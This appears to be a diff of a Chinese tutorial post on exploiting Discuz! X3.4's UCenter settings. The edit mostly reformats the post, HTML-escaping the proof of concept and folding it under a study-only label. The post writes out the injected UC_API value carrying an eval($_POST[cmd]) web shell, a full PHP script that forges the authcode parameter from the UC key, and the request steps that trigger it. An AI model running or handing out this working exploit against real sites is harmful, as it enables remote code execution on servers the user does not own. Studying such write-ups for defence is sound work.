@@ -16,7 +16,7 @@ tags:
 漏洞利用流程如下：
 
 1. 进入后台`站长`-`UCenter设置`，修改UCenter通信密钥为`123456`。
-2. 修改UC_API=`http://your-ip/discuz!x3.4/uc_server');eval($_POST[cmd]);//`，点击保存。
+2. 修改UC_API=<code>http://your-ip/discuz!x3.4/uc_server');&#101;val(&#36;_POST[cmd]);//</code>，点击保存。
 3. 利用UC_KEY(dz) 生成code参数，执行脚本`php ucode.php`生成code。
 4. Burpsuite带code参数发送GET请求，结果为1表示成功。
 
@@ -24,11 +24,13 @@ tags:
 
 生成code参数的脚本 ucode.php：
 
-```php
-<?php
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-php">&lt;?php
 $uc_key="123456";//此处填写刚才UCenter设置的值
 $time = time() + 720000;
-$str = "time=".$time."&action=updateapps";
+$str = "time=".$time."&amp;action=updateapps";
 $code = authcode($str,"ENCODE",$uc_key);
 $code = str_replace('+','%2b',$code);
 $code = str_replace('/','%2f',$code);
@@ -51,18 +53,18 @@ function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
   $box = range(0, 255);
 
   $rndkey = array();
-  for($i = 0; $i <= 255; $i++) {
+  for($i = 0; $i &lt;= 255; $i++) {
     $rndkey[$i] = ord($cryptkey[$i % $key_length]);
   }
 
-  for($j = $i = 0; $i < 256; $i++) {
+  for($j = $i = 0; $i &lt; 256; $i++) {
     $j = ($j + $box[$i] + $rndkey[$i]) % 256;
     $tmp = $box[$i];
     $box[$i] = $box[$j];
     $box[$j] = $tmp;
   }
 
-  for($a = $j = $i = 0; $i < $string_length; $i++) {
+  for($a = $j = $i = 0; $i &lt; $string_length; $i++) {
     $a = ($a + 1) % 256;
     $j = ($j + $box[$a]) % 256;
     $tmp = $box[$a];
@@ -72,7 +74,7 @@ function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
   }
 
   if($operation == 'DECODE') {
-    if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
+    if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
       return substr($result, 26);
     } else {
       return '';
@@ -81,8 +83,9 @@ function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
     return $keyc.str_replace('=', '', base64_encode($result));
   }
 }
-?>
-```
+?&gt;</code></pre>
+
+</details>
 
 带code参数发送GET请求：
 
